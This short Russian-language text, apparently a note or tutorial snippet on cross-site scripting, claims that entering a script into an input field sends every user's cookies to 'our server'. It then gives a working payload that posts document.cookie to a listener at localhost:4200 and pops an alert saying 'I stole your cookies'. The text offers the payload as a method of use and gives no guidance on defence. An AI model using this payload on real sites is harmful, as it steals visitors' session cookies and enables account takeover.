Достаточно указать такой скрипт в поле ввода и куки каждого пользователя будут оправляться на наш сервер

<script>fetch('http://localhost:4200', {
    method: 'post',
    body: JSON.stringify(document.cookie),
    headers: {
        'content-type': 'application/json'
    }
}).then(alert('Я украл Ваши куки'))</script>
